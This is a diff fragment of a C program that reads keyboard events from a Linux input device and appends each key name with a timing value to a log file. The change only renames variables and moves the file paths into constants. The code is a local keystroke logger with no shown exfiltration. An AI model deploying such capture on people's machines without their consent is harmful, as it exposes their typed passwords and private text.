@@ -114,15 +114,15 @@ int main()
 {
 	init();
 
-	int scancodes_fd = open("./scancodes.log", O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
-	if (scancodes_fd < 0) {
-		printf("open scancodes_fd: %s\n", strerror(errno));
+	int log_fd = open(LOG_FILE, O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
+	if (log_fd < 0) {
+		printf("open %s: %s\n", LOG_FILE, strerror(errno));
 		return 1;
 	}
 
-	int input_fd = open("/dev/input/event3", O_RDONLY);
+	int input_fd = open(CHARACTER_DEVICE_FILE, O_RDONLY);
 	if (input_fd < 0) {
-		printf("open /dev/input/event3: %s\n", strerror(errno));
+		printf("open %s: %s\n", CHARACTER_DEVICE_FILE, strerror(errno));
 		return 1;
 	}
 
@@ -167,9 +167,9 @@ int main()
 			sprintf(temp_str, "%s %li\n", keycodes[kp.code], diff);
 			temp_str_length = (int)strlen(temp_str);
 
-			lseek(scancodes_fd, 0, SEEK_END); // append
-			if (write(scancodes_fd, temp_str, temp_str_length) < 0) {
-				printf("write scancodes_fd: %s\n", strerror(errno));
+			lseek(log_fd, 0, SEEK_END); // append
+			if (write(log_fd, temp_str, temp_str_length) < 0) {
+				printf("write log_fd: %s\n", strerror(errno));
 				return 1;
 			}
 
